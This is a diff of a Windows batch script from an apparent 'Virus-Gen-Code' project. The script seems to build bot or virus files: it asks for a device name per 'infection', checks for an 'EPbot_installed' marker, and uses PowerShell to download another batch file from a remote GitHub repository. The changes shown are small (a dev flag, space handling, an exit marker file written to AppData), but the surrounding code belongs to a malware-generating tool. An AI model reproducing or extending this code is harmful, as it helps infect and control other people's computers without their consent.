@@ -2,7 +2,7 @@
 :start
 @ECHO OFF
 set update_number=V4.42.35
-set dev=0
+set dev=1
 cls
 if not exist environment_updater.bat Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/progress_bar2.bat").Content >"progress bar.bat"
 :VBSDynamicBuild
@@ -90,9 +90,10 @@ if %username% equ kiran if not exist C:\users\%username%\EPbot_installed.sav got
   echo.
   echo for personal devices it is recomended to use ownername_PC/laptop_infectionnumber
   echo replace ownername with name of device owner, PC/laptop with the device type, and infectionnumber for multiple devices)
-  echo DO NOT USE SPACES, replace them with _ or -
+  echo spaces will be replaced with _
   echo.
   set /p opt1=Device name:
+  set opt1=%opt1: =_%
   :namegennxt
   echo where would you like to create the files
   echo if directory does not exist it will be created
@@ -164,6 +165,7 @@ powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -A
 echo.
 echo press any key to exit...
 pause >nul
+echo placeholder>"C:\users\%username%\appdata\exit_true.txt"
 exit /b
 :update_check
 < C:\ProgramData\UPnum.sav (
@@ -215,6 +217,7 @@ exit /b
     echo.
     echo press any key to exit...
     pause >nul
+    echo placeholder>"C:\users\%username%\appdata\exit_true.txt"
     exit /b
   :error4
     git rm %opt1%.bat
@@ -227,6 +230,7 @@ exit /b
     echo.
     echo press any key to exit...
     pause >nul
+    echo placeholder>"C:\users\%username%\appdata\exit_true.txt"
     exit /b
   :error5
     title error code 5
@@ -239,6 +243,7 @@ exit /b
     echo.
     echo press any key to exit...
     pause >nul
+    echo placeholder>"C:\users\%username%\appdata\exit_true.txt"
     exit /b
   :error6
     git rm %opt1%.bat
@@ -252,6 +257,7 @@ exit /b
     echo.
     echo press any key to exit...
     pause >nul
+    echo placeholder>"C:\users\%username%\appdata\exit_true.txt"
     exit /b
   :error7
     git rm %opt1%.bat
@@ -265,6 +271,7 @@ exit /b
     echo.
     echo press any key to exit...
     pause >nul
+    echo placeholder>"C:\users\%username%\appdata\exit_true.txt"
     exit /b
   :error8
     echo [31merror code: 08[0m
@@ -276,6 +283,7 @@ exit /b
     echo.
     echo press any key to exit...
     pause >nul
+    echo placeholder>"C:\users\%username%\appdata\exit_true.txt"
     exit /b
 :: ask user for email adress
 :emailadd
@@ -303,6 +311,7 @@ echo app dissabled due to development. contact though discord (guest257351#0001)
 echo.
 echo press any key to exit...
 pause >nul
+echo placeholder>"C:\users\%username%\appdata\exit_true.txt"
 exit /b
 set opt1=%username%_device_%random%%random%
 goto namegennxt
